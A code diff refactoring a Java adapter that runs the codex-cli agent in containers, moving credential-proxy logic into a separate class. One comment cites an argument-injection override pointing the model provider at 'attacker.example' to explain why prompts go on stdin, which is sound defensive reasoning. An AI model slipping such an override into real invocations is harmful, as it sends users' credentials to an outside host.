@@ -28,7 +28,7 @@ import java.util.Optional;
  *
  * <p>Auth is an API key or a subscription credential the operator registered (ADR-031); this adapter
  * only places what it is given into the child environment. It never logs it and never puts it in
- * argv, which is world-readable through {@code /proc/<pid>/cmdline} and echoed by
+ * argv, which is world-readable through {@code {@code /proc/PID/cmdline}} and echoed by
  * {@code docker inspect}.
  *
  * <p><b>Everything below was measured against the real binary, not read from documentation.</b> The
@@ -48,7 +48,7 @@ public final class CodexAdapter implements HarnessAdapter {
     private static final int MAX_SUMMARY_CHARS = 2_000;
 
     /** What this arm sets itself. A credential of the same name is a collision, not an override. */
-    private static final Map<String, String> OWN_SETTINGS = Map.of("CODEX_QUIET_MODE", "1");
+    static final Map<String, String> OWN_SETTINGS = Map.of("CODEX_QUIET_MODE", "1");
 
     /** What the Codex process reads its key from. Vendor knowledge, and this arm's alone. */
     private static final String API_KEY_VARIABLE = "OPENAI_API_KEY";
@@ -57,7 +57,7 @@ public final class CodexAdapter implements HarnessAdapter {
      * Where the sign-in file waits for the login step to write it (M3.5 part F). This arm's own name: the
      * script below reads it once, writes the file Codex reads, and unsets it before Codex starts.
      */
-    private static final String SIGN_IN_VARIABLE = "CODEX_SIGN_IN_FILE";
+    static final String SIGN_IN_VARIABLE = "CODEX_SIGN_IN_FILE";
 
     /**
      * The exit code the login step uses when it cannot authenticate, so a run that never reached
@@ -96,18 +96,6 @@ public final class CodexAdapter implements HarnessAdapter {
     /** What a proxied run's credential values are: the worker keeps the keys and replaces the values. */
     public static final String PLACEHOLDER = "TEST-PLACEHOLDER";
 
-    /**
-     * The variable a proxied key run's provider reads its key from. It holds {@link #PLACEHOLDER}; the model proxy
-     * drops the header the agent sends and injects the real key.
-     */
-    public static final String PLACEHOLDER_VARIABLE = "SPIRE_MODEL_PLACEHOLDER";
-
-    /** A seat's model call, named exactly in its route as well as under its prefix. */
-    private static final String SEAT_MODEL_CALL = "/backend-api/codex/responses";
-
-    /** The model provider a proxied run defines for itself, so Codex's own {@code openai} provider is never used. */
-    public static final String PROVIDER_ID = "spire";
-
     @Override
     public HarnessType type() {
         return HarnessType.CODEX;
@@ -129,50 +117,52 @@ public final class CodexAdapter implements HarnessAdapter {
      * {@code -c model_providers.openai.base_url=http://attacker.example/v1} redirects the model call
      * and the credential with it, with no shell involved (CWE-88). An end-of-options {@code --}
      * would also close that; stdin closes it and keeps the item's text out of
-     * {@code /proc/<pid>/cmdline} and {@code docker inspect} as well.
+     * {@code {@code /proc/PID/cmdline}} and {@code docker inspect} as well.
      */
     @Override
     public PromptDelivery promptDelivery() {
         return PromptDelivery.STDIN;
     }
 
+    /**
+     * Every flag verified present in `codex exec --help`. Two things the documentation gets
+     * wrong and an earlier draft of the plan asserted anyway: --ask-for-approval does not
+     * exist, and the sandbox mode cannot be workspace-write.
+     *
+     * Codex's Linux sandbox is BUBBLEWRAP (it vendors bwrap), and Docker's default seccomp
+     * profile refuses the user namespace bwrap needs. Making it work would require
+     * seccomp=unconfined on the container — weakening the OUTER boundary to gain an inner one.
+     * And Codex does not fail at startup when its sandbox cannot initialize, so leaving
+     * workspace-write set would mean believing in two boundaries while having one.
+     *
+     * The container is the boundary (ADR-039, RUN-TOPOLOGY §1).
+     *
+     * The trailing "-" is the prompt position, explicitly reading stdin. It is not the prompt.
+     *
+     * THE LOGIN STEP IS NOT DECORATION. codex-cli 0.146.0 does not read OPENAI_API_KEY: with
+     * the variable set and no `~/.codex/auth.json`, it exits 1 immediately printing
+     * "Error: No such file or directory (os error 2)" and no NDJSON at all — measured in the
+     * reference image on 2026-09-10, after every run of the first live dispatch died in 31
+     * seconds and was reported as MODEL_UNAVAILABLE. `codex login --with-api-key` is what
+     * writes that file, and it is what OpenAI's own documentation prescribes for programmatic
+     * use (docs/factory/EXECUTION-LAYER.md quotes it). The design knew; the code did not do it.
+     *
+     * The key crosses on a PIPE from printenv and is never interpolated into the script: argv
+     * is world-readable through {@code /proc/PID/cmdline} and echoed by docker inspect.
+     *
+     * A shell, because `--with-api-key` reads the key from stdin and there is no flag or
+     * variable that avoids the pipe. It is the ONLY shell in this path, `exec` replaces it so
+     * nothing lingers to interpret anything, and the two interpolations are quoted and refused
+     * if they could close the quote. The prompt still arrives on the harness's stdin, which the
+     * entrypoint redirects into the whole command; the login reads its own stdin from the pipe.
+     */
     @Override
     public List<String> command(HarnessInvocation invocation) {
-        // Every flag verified present in `codex exec --help`. Two things the documentation gets
-        // wrong and an earlier draft of the plan asserted anyway: --ask-for-approval does not
-        // exist, and the sandbox mode cannot be workspace-write.
-        //
-        // Codex's Linux sandbox is BUBBLEWRAP (it vendors bwrap), and Docker's default seccomp
-        // profile refuses the user namespace bwrap needs. Making it work would require
-        // seccomp=unconfined on the container — weakening the OUTER boundary to gain an inner one.
-        // And Codex does not fail at startup when its sandbox cannot initialize, so leaving
-        // workspace-write set would mean believing in two boundaries while having one.
-        //
-        // The container is the boundary (ADR-039, RUN-TOPOLOGY §1).
-        //
-        // The trailing "-" is the prompt position, explicitly reading stdin. It is not the prompt.
-        //
-        // THE LOGIN STEP IS NOT DECORATION. codex-cli 0.146.0 does not read OPENAI_API_KEY: with
-        // the variable set and no `~/.codex/auth.json`, it exits 1 immediately printing
-        // "Error: No such file or directory (os error 2)" and no NDJSON at all — measured in the
-        // reference image on 2026-09-10, after every run of the first live dispatch died in 31
-        // seconds and was reported as MODEL_UNAVAILABLE. `codex login --with-api-key` is what
-        // writes that file, and it is what OpenAI's own documentation prescribes for programmatic
-        // use (docs/factory/EXECUTION-LAYER.md quotes it). The design knew; the code did not do it.
-        //
-        // The key crosses on a PIPE from printenv and is never interpolated into the script: argv
-        // is world-readable through /proc/<pid>/cmdline and echoed by docker inspect.
-        //
-        // A shell, because `--with-api-key` reads the key from stdin and there is no flag or
-        // variable that avoids the pipe. It is the ONLY shell in this path, `exec` replaces it so
-        // nothing lingers to interpret anything, and the two interpolations are quoted and refused
-        // if they could close the quote. The prompt still arrives on the harness's stdin, which the
-        // entrypoint redirects into the whole command; the login reads its own stdin from the pipe.
         String script = login(invocation)
                 + "exec codex exec --json --sandbox danger-full-access --skip-git-repo-check"
                 + " --model " + quoted(invocation.model(), "model")
                 + effort(invocation.reasoningEffort())
-                + modelProxy(invocation)
+                + CodexModelProxy.settings(invocation)
                 + extraCallsOff(invocation)
                 + projectGuidance(invocation)
                 + " -C " + quoted(invocation.workspacePath(), "workspace path")
@@ -206,45 +196,13 @@ public final class CodexAdapter implements HarnessAdapter {
                 + " || exit " + LOGIN_FAILED + "; ";
     }
 
-    private static boolean isSeat(HarnessInvocation invocation) {
+    static boolean isSeat(HarnessInvocation invocation) {
         return invocation.credentials().containsKey(HarnessInvocation.SIGN_IN);
     }
 
     /** The flags that switch off what a run never needs; a seat run also switches off apps. */
     private static String extraCallsOff(HarnessInvocation invocation) {
         return isSeat(invocation) ? NO_EXTRA_CALLS + NO_APPS : NO_EXTRA_CALLS;
-    }
-
-    /**
-     * Nothing for a run that talks to the vendor itself; for a proxied one, a provider of its own pointed at the model
-     * proxy. Measured against codex-cli 0.156.1 in the 2026-11-07 spike: a key run needs the provider's base URL
-     * {@code /v1}, its key variable and the responses wire API; a seat run the base URL {@code /backend-api/codex},
-     * {@code requires_openai_auth} (so the sign-in file is read) and the top-level {@code chatgpt_base_url}. The string
-     * values are TOML, hence the double quotes inside the single ones, as for the thinking level.
-     */
-    private static String modelProxy(HarnessInvocation invocation) {
-        if (!invocation.credentialProxied()) {
-            return "";
-        }
-        String provider = "model_providers." + PROVIDER_ID + ".";
-        String origin = CredentialRoute.AGENT_FACING_ORIGIN;
-        String common = setting("model_provider", PROVIDER_ID)
-                + setting(provider + "name", PROVIDER_ID)
-                + setting(provider + "wire_api", "responses");
-        if (isSeat(invocation)) {
-            return common
-                    + setting(provider + "base_url", origin + "/backend-api/codex")
-                    + " -c " + provider + "requires_openai_auth=true"
-                    + setting("chatgpt_base_url", origin + "/backend-api/");
-        }
-        return common
-                + setting(provider + "base_url", origin + "/v1")
-                + setting(provider + "env_key", PLACEHOLDER_VARIABLE);
-    }
-
-    /** One {@code -c key="value"} override, quoted for the shell line. */
-    private static String setting(String key, String value) {
-        return " -c " + quoted(key + "=\"" + value + "\"", key);
     }
 
     /** Nothing for a run that follows the repository's guidance; the zero budget for one that must not. */
@@ -271,7 +229,7 @@ public final class CodexAdapter implements HarnessAdapter {
      * metacharacter in it, the path from the run unit's own spec — so this is the second lock on a
      * door that is already shut, placed here because that is where the shell is.
      */
-    private static String quoted(String value, String what) {
+    static String quoted(String value, String what) {
         if (value == null || value.isBlank()) {
             throw new IllegalArgumentException(what + " is required");
         }
@@ -292,10 +250,10 @@ public final class CodexAdapter implements HarnessAdapter {
         // The worker hands the key over under the SPI's neutral name; this arm knows what its own
         // process reads. Everything else in the map still goes through the policy, which is where
         // a name that would relocate the config or hijack the child is refused.
-        Map<String, String> credentials = new java.util.LinkedHashMap<>(invocation.credentials());
         if (invocation.credentialProxied()) {
-            return proxiedEnvironment(invocation, credentials);
+            return CodexModelProxy.environment(invocation);
         }
+        Map<String, String> credentials = new java.util.LinkedHashMap<>(invocation.credentials());
         String apiKey = credentials.remove(HarnessInvocation.CREDENTIAL);
         if (apiKey != null) {
             credentials.put(API_KEY_VARIABLE, apiKey);
@@ -307,49 +265,10 @@ public final class CodexAdapter implements HarnessAdapter {
         return EnvironmentPolicy.merge(credentials, OWN_SETTINGS);
     }
 
-    /**
-     * A proxied run's environment, built without reading the model credential's value: the worker hands placeholders
-     * under the neutral keys, and neither is forwarded. A seat gets {@link PlaceholderSignIn}'s file; a key run gets
-     * {@link #PLACEHOLDER} under the variable its provider reads.
-     */
-    private static Map<String, String> proxiedEnvironment(HarnessInvocation invocation,
-                                                          Map<String, String> credentials) {
-        credentials.remove(HarnessInvocation.CREDENTIAL);
-        credentials.remove(HarnessInvocation.SIGN_IN);
-        Map<String, String> reserved = new java.util.LinkedHashMap<>(OWN_SETTINGS);
-        if (isSeat(invocation)) {
-            reserved.put(SIGN_IN_VARIABLE, PlaceholderSignIn.file());
-        } else {
-            reserved.put(PLACEHOLDER_VARIABLE, PLACEHOLDER);
-        }
-        return EnvironmentPolicy.merge(credentials, reserved);
-    }
-
-    /**
-     * The model proxy's route for a proxied run, per payment, from the 2026-11-07 spike (codex-cli 0.156.1, every
-     * request through the proxy with a placeholder only):
-     *
-     * <ul>
-     *   <li>a key run called {@code POST /v1/responses} only; {@code /v1/models} is the model list the same provider
-     *       may read, so both match exactly and nothing else does;</li>
-     *   <li>a seat run called {@code GET /backend-api/codex/models}, {@code POST /backend-api/codex/responses}
-     *       (compaction too), {@code GET /backend-api/wham/accounts/check} and {@code GET
-     *       /backend-api/wham/settings/user}: the two prefixes, and no redirect. The model call is named exactly
-     *       as well, so the model proxy logs it by name and a 401 on it marks the seat; the proxy logs every other
-     *       seat path by its prefix only.</li>
-     * </ul>
-     */
+    /** The model proxy's route for a proxied run, per payment: {@link CodexModelProxy#route}. */
     @Override
     public Optional<CredentialRoute> credentialRoute(HarnessInvocation invocation) {
-        if (!invocation.credentialProxied()) {
-            return Optional.empty();
-        }
-        if (isSeat(invocation)) {
-            return Optional.of(new CredentialRoute("https://chatgpt.com", CredentialRoute.Injection.CHATGPT_SEAT,
-                    java.util.Set.of(SEAT_MODEL_CALL), List.of("/backend-api/codex/", "/backend-api/wham/")));
-        }
-        return Optional.of(new CredentialRoute("https://api.openai.com", CredentialRoute.Injection.BEARER,
-                java.util.Set.of("/v1/responses", "/v1/models"), List.of()));
+        return CodexModelProxy.route(invocation);
     }
 
     /**
